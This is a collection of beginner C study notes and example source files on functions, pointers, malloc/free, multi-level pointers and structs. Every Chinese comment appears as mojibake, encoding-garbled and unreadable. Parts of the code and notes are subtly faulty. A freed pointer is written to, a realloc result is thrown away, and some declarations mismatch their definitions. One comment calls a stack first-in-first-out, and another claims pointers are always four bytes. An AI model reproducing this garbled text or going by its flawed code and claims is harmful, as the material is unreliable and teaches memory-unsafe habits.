å¯ä»¥ä¸å†™å˜é‡å void get_max(int, int); // å‡½æ•°å£°æ˜ï¼Œè®°å¾—åŠ åˆ†å· main.c #include "func.h" void before_func() { printf("æˆ‘æ˜¯å‡½æ•°æµ‹è¯•ï¼Œåœ¨ä¸»å‡½æ•°ä¹‹å‰å®šä¹‰çš„ã€‚"); getchar(); } void main() { // å‡½æ•°å®šä¹‰å†™åœ¨ä¸»å‡½æ•°ä¹‹å‰çš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±æ— éœ€åœ¨ä¸»å‡½æ•°é‡Œé¢å£°æ˜è¿™ä¸ªå‡½æ•°ï¼Œåªéœ€è¦æŠŠå‡½æ•°ä½“å†™åœ¨ä¸»å‡½æ•°å‰å³å¯ //å¦åˆ™ï¼Œéœ€è¦å…ˆå£°æ˜. // æ­¤å‡½æ•°å®šä¹‰åœ¨ä¸»å‡½æ•°ä¹‹å‰ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼Œæ— é¡»å£°æ˜ //before_func(); //åœ¨ä¸»å‡½æ•°ä¹‹åå®šä¹‰çš„ï¼Œéœ€è¦å…ˆå£°æ˜æ‰èƒ½è°ƒç”¨ã€‚ //1.å£°æ˜(è¦æ”¾åœ¨mainå¤–é¢ï¼Œæˆ‘æ”¾åœ¨äº†è‡ªå®šä¹‰çš„å¤´æ–‡ä»¶é‡Œé¢) //2.è°ƒç”¨ //after_func(); // æ±‚æœ€å¤§å€¼ //int i,j; //i=5;j=10; //get_max(i, j); int i; for(i=0;i&lt;20;++i) { get_max(i,i+1); } getchar(); } int after_func() { printf("æˆ‘æ˜¯å‡½æ•°æµ‹è¯•ï¼Œåœ¨ä¸»å‡½æ•°ä¹‹åå®šä¹‰çš„ï¼Œéœ€è¦å…ˆå£°æ˜æ‰èƒ½è°ƒç”¨ã€‚"); getchar(); return 0; } //æ±‚æœ€å¤§å€¼ void get_max(int a, int b) { int max_val = a>b?a:b; printf("%då’Œ%dæ¯”è¾ƒï¼Œæœ€å¤§å€¼ä¸º: %d \n", a,b,max_val); } /* returnå’Œbreakçš„åŒºåˆ«ï¼š 1.break:å¾ªç¯ã€switch 2.returnç»ˆæ­¢å‡½æ•° */ /* å‡½æ•°çš„åˆ†ç±»ï¼š 1.æœ‰å‚å‡½æ•°å’Œæ— å‚å‡½æ•° 2.æœ‰è¿”å›å€¼å’Œæ— è¿”å›å€¼ 3.åº“å‡½æ•°å’Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° 4.æ™®é€šå‡½æ•°å’Œä¸»å‡½æ•°(main)ï¼šä¸€ä¸ªç¨‹åºåªèƒ½æœ‰ä¸€ä¸ªä¸»å‡½æ•°ï¼Œä¸»å‡½æ•°æ—¢æ˜¯ç¨‹åºçš„å…¥å£ï¼Œä¹Ÿæ˜¯ç¨‹åºçš„å‡ºå£ ä¸»å‡½æ•°èƒ½è°ƒç”¨ä¸»å‡½æ•°ï¼Œå…¶ä»–å‡½æ•°ä¸èƒ½è°ƒç”¨mainå‡½æ•°ï¼Œæ™®é€šå‡½æ•°å¯ä»¥ç›¸äº’è°ƒç”¨ 5.å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’(å…¶å®è¿™æ ·è¯´æ˜¯ä¸å¯¹çš„) */ /* å¦‚ä½•åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œåˆç†çš„è®¾è®¡å‡½æ•°æ¥è§£å†³å®é™…é—®é¢˜ï¼š åŠŸèƒ½åˆ’åˆ†çš„è¯¦ç»†ä¸€äº›ï¼Œæé«˜åˆ©ç”¨ç‡ å‡½æ•°æ˜¯Cè¯­è¨€çš„åŸºæœ¬å•ä½ï¼Œç±»æ˜¯Javaï¼ŒC#ç­‰çš„åŸºæœ¬å•ä½ */ /* å¸¸ç”¨çš„ç³»ç»Ÿå‡½æ•°: 1. doulbe sqrt(double x) æ±‚xçš„å¹³æ–¹æ ¹ 2. int abs(int x) æ±‚æ•´æ•°çš„ç»å¯¹å€¼ 3. double fabs(double x) æ¨èä¹¦ç±ï¼š æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾ï¼šã€Šturboc2.0ä½¿ç”¨å¤§å…¨ã€‹ */ /* é€’å½’ï¼š æ ˆï¼šå…ˆè¿›å…ˆå‡º */ /* å˜é‡çš„ä½œç”¨äºå’Œå­˜å‚¨æ–¹å¼ï¼š 1.æŒ‰ä½œç”¨åŸŸåˆ†ï¼šå…¨å±€å˜é‡ï¼Œå±€éƒ¨å˜é‡ï¼ˆå‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡/å‡½æ•°çš„å½¢å‚ï¼‰ 2.æŒ‰å˜é‡çš„å­˜å‚¨æ–¹å¼ï¼šé™æ€å˜é‡ï¼Œè‡ªåŠ¨å˜é‡ï¼Œå¯„å­˜å™¨å˜é‡ */ int k=99; void test_var() { //å±€éƒ¨å˜é‡ä¸å…¨å±€å˜é‡å‘½åç›¸åŒï¼šå±€éƒ¨å˜é‡ä¼šå±è”½æ‰å…¨å±€å˜é‡ } æŒ‡é’ˆtest.h #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #define N 5 void test1(); void test2(); void test3(); void test4(); void test5(); void test6(); void test7(); void test8(); void base_pointer(); void free_test(); void exchange_two(); void test_exchange1(int,int); void test_exchange2(int,int); void test_exchange3(int,int); void two_pointer(); void dynami_memo1(); void dynami_memo2(); void dynami_memo3(); void dynami_memo4(); void dynami_memo5(); void dynami_memo6(); main.c #include "test.h" void main() { //base_pointer(); exchange_two(); } void test1() { int j=3; int * q; // qæ˜¯å˜é‡å, int *è¡¨ç¤ºqå˜é‡å­˜æ”¾çš„æ˜¯intç±»å‹å˜é‡çš„åœ°å€ï¼ˆint * æ˜¯æ•°æ®ç±»å‹ï¼‰ // é”™è¯¯å†™æ³•ï¼šq=55; åé¢ä¸èƒ½æ˜¯å€¼ï¼Œåªèƒ½è·Ÿåœ°å€ q=&amp;j; //*qä¸jæ˜¯ç­‰åŒçš„ /* 1.qä¿å­˜äº†jçš„åœ°å€ï¼Œå¼•èµ·ï¼šqæŒ‡å‘jã€‚ 2.qä¸æ˜¯jï¼Œjä¸æ˜¯qã€‚ä¿®æ”¹qçš„å€¼ä¸ä¼šå½±å“j,ä¿®æ”¹jçš„å€¼ä¹Ÿä¸ä¼šå½±å“qçš„å€¼ 3.å¦‚æœä¸€ä¸ªæŒ‡é’ˆå˜é‡æŒ‡å‘ä¸€ä¸ªæ™®é€šå˜é‡ï¼Œåˆ™*æŒ‡é’ˆå˜é‡å®Œå…¨ç­‰åŒäºæ™®é€šå˜é‡ */ /* æŒ‡é’ˆï¼šå°±æ˜¯åœ°å€ï¼Œåœ°å€å°±æ˜¯æŒ‡é’ˆ æŒ‡é’ˆå˜é‡ï¼šå­˜æ”¾åœ°å€çš„å˜é‡ ä¸¤è€…ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µ ä½†æ˜¯ï¼Œé€šå¸¸åœ¨å™è¿°ä¸­ï¼Œä¼šæŠŠæŒ‡é’ˆå˜é‡ç®€ç§°ä¸ºæŒ‡é’ˆ */ // ä¸€çº§æŒ‡é’ˆ // æŒ‡é’ˆçš„æœ¬è´¨ï¼š å­˜åœ°å€(å†…å­˜å•å…ƒçš„ç¼–å·)ï¼Œé—´æ¥è®¿é—® // æŒ‡é’ˆä½¿ç”¨åœºæ™¯ï¼š // &amp; å–åœ°å€æ“ä½œç¬¦/ã€å¼•ç”¨ã€‘ // * å–å€¼æ“ä½œç¬¦/ã€è§£å¼•ç”¨ã€‘ } void test2() { /* æŒ‡é’ˆçš„é‡è¦æ€§; è¡¨ç¤ºä¸€äº›å¤æ‚çš„æ•°æ®ç»“æ„; å¿«é€Ÿçš„ä¼ é€’æ•°æ® ä½¿å‡½æ•°è¿”å›ä¸€ä¸ªä»¥ä¸Šçš„å€¼ èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶ èƒ½æ–¹ä¾¿çš„å¤„ç†å­—ç¬¦ä¸² æ˜¯ç†è§£é¢å‘å¯¹è±¡è¯­è¨€ä¸­å¼•ç”¨çš„åŸºç¡€ */ //åœ°å€ï¼š /* å†…å­˜å•å…ƒçš„ç¼–å· ä»é›¶å¼€å§‹çš„éè´Ÿæ•´æ•° èŒƒå›´ï¼š */ //æŒ‡é’ˆï¼š /* æŒ‡é’ˆå°±æ˜¯åœ°å€ï¼Œåœ°å€å°±æ˜¯æŒ‡é’ˆ æŒ‡é’ˆå˜é‡å°±æ˜¯å­˜æ”¾å†…å­˜å•å…ƒçš„å˜é‡ï¼Œ ä¸¤è€…ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µ ä½†æ˜¯ï¼Œé€šå¸¸åœ¨å™è¿°ä¸­ï¼Œä¼šæŠŠæŒ‡é’ˆå˜é‡ç®€ç§°ä¸ºæŒ‡é’ˆ æŒ‡é’ˆçš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ªæ“ä½œå—é™çš„éè´Ÿæ•´æ•° */ //æŒ‡é’ˆçš„åˆ†ç±»ï¼š /* 1.åŸºæœ¬ç±»å‹çš„æŒ‡é’ˆ int *p; int i=10; int j; p = &amp;i; i=*p; printf("%d",j); ä¾‹å­ï¼Œè§å‡½æ•°base_pointer */ } void base_pointer() { int *p; int *q; int i=5; //*p = i; //ã€é”™è¯¯ã€‘ï¼Œ*pä»£è¡¨çš„æ˜¯pæŒ‡å‘çš„åœ°å€çš„å˜é‡çš„å€¼ï¼Œpç°åœ¨æŒ‡å‘çš„åƒåœ¾å€¼(è¿˜æ²¡æœ‰åˆå§‹åŒ–) //åº”è¯¥è¿™æ · p = &amp;i; //*q=p; //ã€é”™è¯¯ã€‘ï¼Œæœ‰è¯­æ³•é”™è¯¯ï¼Œ*qæ˜¯æ•´å½¢ï¼Œpæ˜¯int*ç±»å‹ //*q = *p; //ã€é”™è¯¯ã€‘,è¯­æ³•æ²¡é”™ï¼Œä½†æ˜¯qæŒ‡å‘åƒåœ¾å€¼ï¼ˆæ²¡åˆå§‹åŒ–ï¼‰ //åº”è¯¥è¿™æ ·ï¼š //p=q; // ã€é”™è¯¯ã€‘ï¼Œqèµ‹ç»™pï¼Œpä¹Ÿå˜æˆåƒåœ¾å€¼ //printf("%d\n", *p); // qçš„ç©ºé—´æ˜¯å±äºæœ¬ç¨‹åºçš„ï¼Œæ‰€ä»¥æœ¬ç¨‹åºå¯ä»¥è¯»å†™qçš„å†…å®¹ï¼Œä½†æ˜¯å¦‚æœqçš„å†…éƒ¨æ˜¯åƒåœ¾å€¼ï¼Œåˆ™æœ¬ç¨‹åºä¸èƒ½è¯»å†™*pçš„å†…å®¹,å› ä¸º*qæ‰€ä»£è¡¨çš„çš„å†…å­˜å•å…ƒçš„æ§åˆ¶æƒé™å¹¶æ²¡æœ‰åˆ†é…ç»™æœ¬ç¨‹åº // // æŒ‡é’ˆå˜é‡çš„è¿ç®—ï¼š // æŒ‡é’ˆå˜é‡ä¸èƒ½ç›¸åŠ ã€ç›¸ä¹˜ã€ç›¸é™¤ï¼ˆèƒ½ç›¸å‡ï¼šå¦‚æœä¸¤ä¸ªæŒ‡é’ˆå˜é‡æŒ‡å‘çš„æ˜¯ã€åŒä¸€å—è¿ç»­ç©ºé—´ä¸­çš„ä¸åŒå­˜å‚¨å•å…ƒã€‘ï¼‰ /* p = &amp;a[1]; q = &amp;a[3]; printf("%d", q-p); */ getchar(); } //æŒ‡é’ˆçš„åç§» void test3() { int a[N]={1,2,3,4,5}; int *p; int i; p = &amp;a[4]; // æŒ‡å‘aæœ€åä¸€ä¸ªå…ƒç´  for(i=0; i&lt;N; i++) // æŒ‡é’ˆåç§» { printf("%3d", *(p-i)); // p +sizeof(int) } printf("\n"); getchar(); } //æŒ‡é’ˆä¸è‡ªå¢ void test4() { int a[3]={2,7,8}; int *p; int j; p = a; j = *p++; // j = *p; p=p+1ã€‚ printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,2,7 j = p[0]++; // j=p[0], p[0] = p[0] +1 printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,7,8 ï¼Ÿï¼Ÿï¼Ÿ getchar(); } //é‡æŒ‡é’ˆ: freeä»¥åçš„æŒ‡é’ˆæœªè¢«èµ‹å€¼ä¸ºNULL (æŒ‡å‘äº†ä¸€ä¸ªæœªçŸ¥çš„ç©ºé—´) void test5() { int *p, *p1, *p2, *p3; p = (int *)malloc(4); *p = 1; free(p); p = NULL; // èµ‹å€¼nullä»¥åï¼Œåé¢ç”¨çš„è¯ä¼šå´©æºƒï¼Œèƒ½è¿…é€Ÿæ‰¾åˆ°é—®é¢˜ p1 = (int *)malloc(4); *p1 = 2; // æ²¡æœ‰free p2 = (int *)malloc(4); *p2 = 2; free(p1); p3 = (int *)malloc(4); *p3 = 3; *p1 = 20; // ä»¥ä¸ºp1freeäº†ï¼Œè¿™é‡Œåˆèµ‹å€¼ printf("p3 = %d", *p3); // 20äº† mallocæœ‰ç¼“å­˜æœºåˆ¶ } // ç»å…¸ç¨‹åºï¼šäº’æ¢ä¸¤ä¸ªæ•°å­— void exchange_two() { int a=3; int b=5; //int t; //ä¹‹å‰çš„åšæ³• //t=a; //a=b; //b=t; // ç°åœ¨è¦æ±‚è°ƒç”¨ä¸€ä¸ªå‡½æ•°å®ç° test_exchange3(&amp;a, &amp;b); printf("a=%d,b=%d",a,b); getchar(); } // ä¸èƒ½å®Œæˆäº’æ¢åŠŸèƒ½ void test_exchange1(int a, int b) { int t; t=a; a=b; b=t; } // ä¸èƒ½å®Œæˆäº’æ¢åŠŸèƒ½ï¼Œåªæ˜¯æŠŠqå’Œpçš„å€¼æ¢äº†ï¼Œaå’Œbå¹¶æ²¡æœ‰äº’æ¢ void test_exchange2(int *p, int *q) { int *t; // å¦‚æœè¦äº’æ¢ï¼Œå˜é‡ç±»å‹å¿…é¡»ä¸€è‡´ t = p; p = q; q = t; // å½¢å‚çš„æ”¹å˜ï¼Œä¸ä¼šæ”¹å˜å®å‚çš„å€¼ } // å¯ä»¥å®Œæˆäº’æ¢: pæ˜¯açš„åœ°å€ï¼Œ*på°±æ˜¯a void test_exchange3(int *p, int *q) { int t; // å¦‚æœè¦äº’æ¢ï¼Œå˜é‡ç±»å‹å¿…é¡»ä¸€è‡´ t = *p; // *pæ˜¯intï¼Œpæ˜¯int* *p = *q; *q = t; } // *çš„å«ä¹‰ void test6() { //1.ä¹˜æ³• //2.å®šä¹‰æŒ‡é’ˆå˜é‡ int *p; //å®šä¹‰äº†ä¸€ä¸ªå«pçš„å˜ï¼Œint *è¡¨ç¤ºpåªèƒ½å­˜æ”¾åœ°å€ //3.æŒ‡é’ˆè¿ç®—ç¬¦ï¼šå–åœ°å€çš„é€†è¿ç®—/é—´æ¥è®¿é—® // æ”¾åœ¨å·²ç»å®šä¹‰å¥½çš„æŒ‡é’ˆå˜é‡çš„å‰é¢ï¼Œå–æ”¹æŒ‡é’ˆçš„å€¼ //*p è¡¨ç¤ºä»¥pçš„å†…å®¹ä¸ºåœ°å€çš„å˜é‡ //å†™æ³•ï¼šä¸‹é¢ä¸‰ç§æ˜¯ç­‰ä»·çš„ //int * p; //int *p; //int* p; } void free_test() { /* è„æ•°æ® ç”³è¯·çš„ç©ºé—´ä¸é‡Šæ”¾ï¼šå†…å­˜æ³„éœ² å †ç©ºé—´ï¼šä¸€æ—¦ç”³è¯·ï¼Œä¸€ç›´å ç”¨ï¼Œé™¤éfree */ int i; char *p; scanf("%d", &amp;i); p = (char *)malloc(i); strcpy(p, "hello"); // pæŒ‡å‘å †ç©ºé—´ // p = "hellp"; puts(p); free(p); // é‡Šæ”¾ printf("free p ~~~~~~~~~~~"); } void test7() { // ä¸€ä¸ªæŒ‡é’ˆå˜é‡åˆ°åº•å å‡ ä¸ªå­—èŠ‚ï¼Ÿ /* æŒ‡å‘ä¸åŒç±»å‹ï¼Œæ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚int ä¸€èˆ¬æ˜¯4ä¸ªå­—èŠ‚, charå°±æ˜¯1ä¸ªã€‚ sizeof()å¯ä»¥æŸ¥çœ‹ï¼šsizeof(double) p,q,ræ‰€å çš„å­—èŠ‚æ•°æ˜¯ä¸€æ ·çš„ ã€æ€»ç»“ï¼šã€‘ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œæ— è®ºä»–æŒ‡å‘çš„å˜é‡å å‡ ä¸ªå­—èŠ‚ï¼Œè¯¥æŒ‡é’ˆå˜é‡åªå å››ä¸ªå­—èŠ‚ã€‚ ä¸€ä¸ªå˜é‡çš„åœ°å€ä½¿ç”¨è¯¥å˜é‡é¦–å­—èŠ‚çš„åœ°å€æ¥è¡¨ç¤º */ } //åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆé‡ç‚¹ï¼‰ void test8() { /* 1.ä¼ ç»Ÿæ•°ç»„çš„ç¼ºç‚¹ a.æ•°ç»„é•¿åº¦å¿…é¡»äº‹å…ˆåˆ¶å®šï¼Œä¸”åªèƒ½æ˜¯é•¿æ•´æ•°ï¼Œä¸èƒ½æ˜¯å˜é‡ï¼ˆint len=5; int a[len]; è¿™æ ·æ˜¯é”™è¯¯çš„ï¼‰ b.ä¼ ç»Ÿå½¢å¼å®šä¹‰çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„å†…å­˜ï¼Œç¨‹åºå‘˜æ— æ³•æ‰‹åŠ¨é‡Šæ”¾ï¼ˆä¸€æ—¦å®šä¹‰ï¼Œè¯¥åˆ†é…ç©ºé—´ä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°æ•°ç»„æ‰€åœ¨çš„å‡½æ•°è¿è¡Œç»“æŸï¼Œæ•°ç»„çš„ç©ºé—´æ‰ä¼šè¢«ç³»ç»Ÿé‡Šæ”¾ï¼‰ c.æ•°ç»„çš„é•¿åº¦ä¸èƒ½å†å‡½æ•°è¿è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€æ‰©å……æˆ–ç¼©å°(é•¿åº¦ä¸€æ—¦å®šä¹‰ï¼Œå…¶é•¿åº¦å°±ä¸èƒ½å†æ›´æ”¹) d.Aå‡½æ•°å®šä¹‰çš„æ•°ç»„ï¼Œåœ¨Aå‡½æ•°è¿è¡ŒæœŸé—´å¯ä»¥è¢«å…¶ä»–å‡½æ•°ä½¿ç”¨ï¼›ä½†Aå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼ŒAå‡½æ•°ä¸­çš„æ•°ç»„å°†æ— æ³•å†è¢«å…¶ä»–å‡½æ•°ä½¿ç”¨ ä¼ ç»Ÿæ•°ç»„ä¹Ÿå«é™æ€æ•°ç»„ 2.ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€åˆ†é…å†…å­˜ è§£å†³äº†ä¼ ç»Ÿæ•°ç»„çš„4ä¸ªç¼ºé™· 3.åŠ¨æ€å†…å­˜åˆ†é…ä¸¾ä¾‹_ åŠ¨æ€æ•°ç»„çš„æ„é€  4.é™æ€å†…å­˜å’ŒåŠ¨æ€å†…å­˜çš„æ¯”è¾ƒ 5.è·¨å‡½æ•°ä½¿ç”¨å†…å­˜çš„é—®é¢˜ */ } void dynami_memo1() { // malloc æ˜¯memory(å†…å­˜) allocate(åˆ†é…)çš„ç¼©å†™ int i = 5; char *p; p = (char *)malloc(i); /* 1.è¦ä½¿ç”¨mallocï¼Œå¿…é¡»æ·»åŠ malloc.hæˆ–stdlib.hå¤´æ–‡ä»¶ 2.mallocåªæœ‰ä¸€ä¸ªå½¢å‚ï¼Œä¸”å½¢å‚å¿…é¡»æ˜¯æ•´æ•°ç±»å‹ 3.ä¸Šé¢ï¼Œè¡¨ç¤ºè¯·æ±‚ç³»ç»Ÿä¸ºæœ¬ç¨‹åºåˆ†é…5ä¸ªå­—èŠ‚ 4.mallocå‡½æ•°åªèƒ½è¿”å›ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œæ‰€ä»¥å‰é¢è¦æŠŠåœ°å€å¼ºåˆ¶è½¬æ¢ä¸ºint* 5.pæœ¬èº«çš„å†…å­˜æ˜¯é™æ€åˆ†é…çš„ï¼Œpæ‰€æŒ‡å‘çš„å†…å­˜æ˜¯åŠ¨æ€åˆ†é…çš„ */ strcpy(p, "hello"); // pæŒ‡å‘å †ç©ºé—´ // p = h e l l o \o; puts(p); free(p); // é‡Šæ”¾pæ‰€æŒ‡å‘çš„å†…å­˜ ï¼ˆpæœ¬èº«çš„å†…å­˜æ˜¯é™æ€çš„ï¼Œä¸èƒ½ç”±ç¨‹åºå‘˜æ‰‹åŠ¨é‡Šæ”¾ï¼‰ printf("free p ~~~~~~~~~~~"); // è„æ•°æ® // ç”³è¯·çš„ç©ºé—´ä¸é‡Šæ”¾ï¼šå†…å­˜æ³„éœ² // å †ç©ºé—´ï¼šä¸€æ—¦ç”³è¯·ï¼Œä¸€ç›´å ç”¨ï¼Œé™¤éfree } void f(int *q) { // *p = 200; // error // q = 20 //error // qæ˜¯pçš„ä¸€ä»½æ‹·è´(å‰¯æœ¬) // **q=200 // error *q=200; } void dynami_memo2() { //int *arr = (int*)malloc(20); // int *p; // arr[0] = 1; // arr[1] = 1; // arr[2] = 1; // arr[3] = 1; // p = (int*)realloc(arr, 40); // æ‰©å±• // p[4] = 6; int *p = (int *)malloc(sizeof(int)); *p = 10; printf("%d\n", *p); //10 f(p); printf("%d\n", *p); //200 } //åŠ¨æ€å†…å­˜åˆ†é…ä¸¾ä¾‹ åŠ¨æ€ä¸€ç»´æ•°ç»„çš„æ„é€  void dynami_memo3() { int len; int *pArr; int i; printf("è¯·è¾“å‡ºè¦å­˜æ”¾å…ƒç´ çš„ä¸ªæ•°ï¼š"); scanf("%d", &amp;len); // 5 pArr = (int *)malloc(4*len); // æ•°ç»„é•¿åº¦ä¸ºlenï¼› 5*4=20,ï¼ˆé»˜è®¤pArræŒ‡å‘ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯ç”±äºè¿›è¡Œäº†intå¼ºè½¬ï¼Œæ‰€ä»¥pArræŒ‡å‘å‰å››ä¸ªå­—èŠ‚,pArræŒ‡å‘åé¢4ä¸ªå­—èŠ‚ï¼‰ //ç±»ä¼¼äº int pArr[len]; //èµ‹å€¼ for (i=0; i&lt;len; ++i) { scanf("%d", &amp;pArr[i]); } //è¾“å‡º printf("ä¸€ç»´æ•°ç»„çš„å†…å®¹æ˜¯: \n"); for (i=0; i&lt;len; ++i) { printf("%d, ", pArr[i]); } realloc(pArr, 40); // æ‰©å±• //é‡Šæ”¾æ•°ç»„ free(pArr); } //åŠ¨æ€å†…å­˜å’Œé™æ€å†…å­˜çš„æ¯”è¾ƒ void dynami_memo4() { /* é™æ€å†…å­˜æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…ï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨é‡Šæ”¾ï¼Œæ˜¯åœ¨æ ˆåˆ†é…çš„ åŠ¨æ€å†…å­˜æ˜¯ç”±ç¨‹åºå‘˜æ‰‹åŠ¨åˆ†é…ï¼Œæ‰‹åŠ¨é‡Šæ”¾ï¼Œæ˜¯ç”±å †åˆ†é…çš„ mallocæ˜¯å †åˆ†é…çš„ æ ˆæ˜¯å­˜å‚¨ç»“æ„ï¼Œå †æ˜¯æ’åºæ–¹å¼ */ } void multi_test(int **pp) { int j=300; // ppæ˜¯pçš„åœ°å€ï¼Œé‚£*pp å°±æ˜¯p *pp = &amp;j; // ä¿®æ”¹ **pp = 200; // ä¿®æ”¹ } //å¤šçº§æŒ‡é’ˆï¼ˆæ„ä¹‰ï¼šè·¨å‡½æ•°ä½¿ç”¨å†…å­˜ï¼‰ void two_pointer() { // ã€åœºæ™¯ã€‘ï¼šå½“åœ¨å­å‡½æ•°ä¸­éœ€è¦ä¿®æ”¹ä¸»å‡½æ•°æŸä¸€ä¸ªä¸€çº§æŒ‡é’ˆå˜é‡çš„å€¼ï¼Œå°±éœ€è¦äºŒçº§æŒ‡é’ˆ //char b[N][10] = {"lilei","hanmeimei","xiyangyang","huitailang", "xiongda"}; //char * p[N]; // æŒ‡é’ˆæ•°ç»„ï¼Œé‡Œé¢å­˜å‚¨çš„æŒ‡é’ˆç±»å‹å°±æ˜¯ äºŒçº§æŒ‡é’ˆ // &amp;p[0] æ¯æ¬¡åç§»æ˜¯å›ºå®šçš„ï¼Œ64ä½æ•°ä¸‹å°±æ˜¯8ä¸ªå­—èŠ‚ //// char **p2; //int i; //for(i=0; i&lt;N; i++) //{ // p[i] = b[i]; //} //for(i=0; i&lt;N; i++) //{ // puts(p[i]); //} int i = 10; int *p = &amp;i; int **q = &amp;p; int ***r = &amp;q; //r = &amp;p; // é”™è¯¯ï¼Œå› ä¸ºræ˜¯int**ç±»å‹ï¼Œråªèƒ½å­˜æ”¾int**ç±»å‹å˜é‡çš„åœ°å€ printf("%d",***r); // rçš„å€¼ //åœ¨å¦ä¸€ä¸ªå‡½æ•°å†…éƒ¨æ”¹å˜å˜é‡å€¼ multi_test(&amp;p); // pæ˜¯int *, é‚£ä¹ˆ &amp;pæ˜¯int** } void f1(int **q) { int i=5; //*qç­‰ä»·äºpï¼Œqå’Œ**qéƒ½ä¸ç­‰ä»·äºp // *q=i // error *q = &amp;i; // p=&amp;i //**q=i; } //é™æ€å˜é‡ä¸èƒ½è·¨å‡½æ•°ä½¿ç”¨ void dynami_memo5() { int *p; f1(&amp;p); printf("%d", *p); // æœ¬è¯­å¥è¯­æ³•æ²¡æœ‰é—®é¢˜ï¼Œä½†é€»è¾‘ä¸Šæœ‰é—®é¢˜ï¼ˆå› ä¸ºfå‡½æ•°ä¸­içš„é™æ€åˆ†é…çš„ï¼Œfç»“æŸï¼Œiçš„ç©ºé—´å°±é‡Šæ”¾äº†ï¼‰ } void f2(int **q) { *q = (int *)malloc(sizeof(int)); // ç­‰ä»·äºp = (int *)malloc(sizeof(int)); //q=5; // error //*q=5; // p=5 error **q=5; // *p=5 } //åŠ¨æ€å†…å­˜å¯ä»¥è·¨å‡½æ•°ä½¿ç”¨ï¼ˆé‡ç‚¹ï¼‰ void dynami_memo6() { int *p; f2(&amp;p); printf("%d", *p); // èƒ½æ”¹å˜ã€‚pæŒ‡å‘çš„æ˜¯ä¸Šé¢å †é‡Œé¢åˆ†é…çš„ç©ºé—´ } ç»“æ„ä½“jiegouti.h #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> void test(); void struc_func(); void InputStudent(struct Student *); void OutputStudent(struct Student); void OutputStudent2(struct Student *); void test_union(); main.c #include "jiegouti.h" void main() { } void test() { /* ä¸ºä»€ä¹ˆéœ€è¦ç»“æ„ä½“ï¼Ÿ ä¸ºäº†è¡¨ç¤ºä¸€äº›å¤æ‚çš„äº‹ç‰©ï¼Œè€Œæ™®é€šçš„æ•°æ®ç±»å‹æ— æ³•æ»¡è¶³å®é™…éœ€æ±‚ ç»“æ„ä½“ï¼š æŠŠä¸€äº›åŸºæœ¬ç±»å‹ç»„åˆåˆ°ä¸€èµ·ï¼Œå½¢æˆçš„ä¸€ä¸ªæ–°çš„ç¬¦åˆæ•°æ®ç±»å‹ å¤§å°ï¼š ç»“æ„ä½“ï¼šæ€»å¤§å°ä¸€èˆ¬æƒ…å†µä¸‹ç­‰äºå„æˆå‘˜å¤§å°ä¹‹å’Œ(å…ˆä¸è€ƒè™‘å†…å­˜å¯¹é½) å…±ç”¨ä½“ï¼šå¤§å°ç­‰äºæˆå‘˜ä¸­æœ€å¤§çš„é‚£ä¸ªå¤§å°ã€‚ï¼ˆé€šå¸¸å’Œç»“æ„ä½“ä¸€èµ·ä½¿ç”¨ï¼‰ å¦‚ä½•å®šä¹‰(æ¨èç¬¬ä¸€ç§)ï¼š 1. æ¨èï¼ˆè¿™åªæ˜¯å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ï¼Œå¹¶æ²¡æœ‰å®šä¹‰å˜é‡ï¼‰ struct student{ int num; char name[20]; int age; }; 2. è¿™æ ·åªèƒ½å®šä¹‰ä¸€æ¬¡ struct student{ int num; char name[20]; int age; } st1; 3. ç±»å‹éƒ½æ²¡å†™... struct { int num; char name[20]; int age; } st1; //èµ‹å€¼å’Œåˆå§‹åŒ–(å®šä¹‰åŒæ—¶å¯ä»¥æ•´ä½“èµ‹å€¼,å®šä¹‰ç©ä¹‹ååªèƒ½å•ä¸ªèµ‹å€¼) å®šä¹‰åŒæ—¶åˆå§‹åŒ–ï¼š struct student s1 = {1,'xxx',18}; å…ˆå®šä¹‰ï¼Œåèµ‹å€¼ï¼š struct student s2; s2.num=1; s2.name='yyy'; s2.age=19; //å–å‡ºç»“æ„ä½“å˜é‡ä¸­æ¯ä¸€ä¸ªæˆå‘˜ã€é‡ç‚¹ã€‘ 1.ç»“æ„ä½“æŒ‡é’ˆå˜é‡å.æˆå‘˜å 2.æŒ‡é’ˆå˜é‡å->æˆå‘˜å ï¼ˆç¬¬äºŒç§æ›´å¸¸ç”¨ï¼‰ struct student *p = &amp;s; //æ³¨æ„æ˜¯&amp; p->name; //ç¬¬ä¸€ç§æ–¹å¼(æŒ‡é’ˆå˜é‡->æˆå‘˜å˜é‡å,åœ¨è®¡ç®—æœºå†…éƒ¨ä¼šè¢«è½¬æ¢ä¸º(*æŒ‡é’ˆå˜é‡å).æˆå‘˜å) (*p).name; //ç¬¬äºŒç§æ–¹å¼ï¼Œä¸ s.name; ç­‰ä»· //ç»“æ„ä½“å˜é‡çš„è¿ç®— ç»“æ„ä½“å˜é‡ä¸èƒ½ç›¸åŠ ï¼Œç›¸å‡ï¼Œä¹Ÿä¸èƒ½ç›¸äº’ä¹˜é™¤ã€‚ 